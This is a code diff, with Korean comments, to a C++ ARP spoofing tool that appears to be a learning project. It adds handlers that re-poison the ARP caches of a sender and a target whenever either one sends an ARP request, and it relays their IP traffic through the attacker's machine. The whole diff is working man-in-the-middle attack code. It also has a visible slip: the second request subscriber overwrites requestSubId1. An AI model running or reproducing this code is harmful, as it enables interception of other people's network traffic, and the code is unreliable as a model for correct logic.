@@ -34,12 +34,11 @@ void ARPSpoof::AttackStart()
         sa->InfectARPTable();
 
         //주기적으로 infect 하는 쓰레드 생성
-        thread maintain (&ARPSpoof::MaintainInfection, this, sa);
-        maintain.detach();
+        //thread maintain (&ARPSpoof::MaintainInfection, this, sa);
+        //maintain.detach();
 
-        //relay 요청
-            //구독 신청 src->attacker -> target
-        Subscriber * sub = new Subscriber( sa->senderMAC, (uint8_t * ) sa->myMAC, 
+        //relay 반응 등록
+        Subscriber * subRelay = new Subscriber( sa->senderMAC, (uint8_t * ) sa->myMAC, 
                                             0, sa->myIP, 
                                             NULL, NULL,
                                             0, 0,
@@ -48,10 +47,58 @@ void ARPSpoof::AttackStart()
                                             ETHERTYPE_IP,
                                             (void *)&ARPSpoof::RelayIPPacket
                                             );
-        pcapManager->AddSubscriber(sub);
-        (*itor)->subID = sub->GetSubID();
+        pcapManager->AddSubscriber(subRelay);
+        (*itor)->relaySubId = subRelay->GetSubID();
+
+        //request 반응 등록 1 
+        // sender가 물어볼 때
+        Subscriber * subRequest1 = new Subscriber( sa->senderMAC, NULL, 
+                                            0, 0, 
+                                            sa->senderMAC, NULL,
+                                            sa->senderIP, sa->targetIP,
+                                            (uint32_t)SUBTYPE::REACTSENDERREQUEST, 
+                                            (void *)this, 
+                                            ETHERTYPE_ARP,
+                                            (void *)&ARPSpoof::ReactRequest
+                                            );
+        
+        pcapManager->AddSubscriber(subRequest1);
+        (*itor)->requestSubId1 = subRequest1->GetSubID();
+
+        //request 반응 등록 2
+        // target이 물어볼 때
+        Subscriber * subRequest2 = new Subscriber( sa->targetMAC, NULL, 
+                                                0, 0, 
+                                                sa->targetMAC, NULL,
+                                                sa->targetIP, 0,
+                                                (uint32_t)SUBTYPE::REACTTARGETREQUEST, 
+                                                (void *)this, 
+                                                ETHERTYPE_ARP,
+                                                (void *)&ARPSpoof::ReactRequest
+                                                );
+        
+        pcapManager->AddSubscriber(subRequest2);
+        (*itor)->requestSubId1 = subRequest2->GetSubID();
 
     }
+}
+
+void ARPSpoof::ReactRequest(uint32_t subID)
+{
+    //infect again
+    list<Attack *>::iterator itor;
+    for (itor=attackList.begin(); itor != attackList.end(); itor++)
+    {
+        if( (*itor)->requestSubId2  == subID || (*itor)->requestSubId1  == subID)
+        {
+            printf("re infection\n");
+            (*itor)->sendArp->InfectARPTable();
+            break;
+        }
+        
+    }
+
+
 }
 
 void ARPSpoof::MaintainInfection(SendARP * sendARP)
@@ -66,7 +113,7 @@ void ARPSpoof::MaintainInfection(SendARP * sendARP)
 
 //target mac을 변경하여 전송
 //sender -> attacker -> target
-void ARPSpoof::RelayIPPacket(const uint8_t * buf, uint32_t len, uint8_t subID)
+void ARPSpoof::RelayIPPacket(const uint8_t * buf, uint32_t len, uint32_t subID)
 {
     uint8_t * modifiedPacket;
     modifiedPacket = (uint8_t *)malloc(len);
@@ -79,7 +126,7 @@ void ARPSpoof::RelayIPPacket(const uint8_t * buf, uint32_t len, uint8_t subID)
     list<Attack *>::iterator itor;
     for (itor=attackList.begin(); itor != attackList.end(); itor++)
     {
-        if( (*itor)->subID  == subID)
+        if( (*itor)->relaySubId  == subID)
         {
             //이더넷 헤더를 target MAC으로 변환
             printf("send modified...\n");
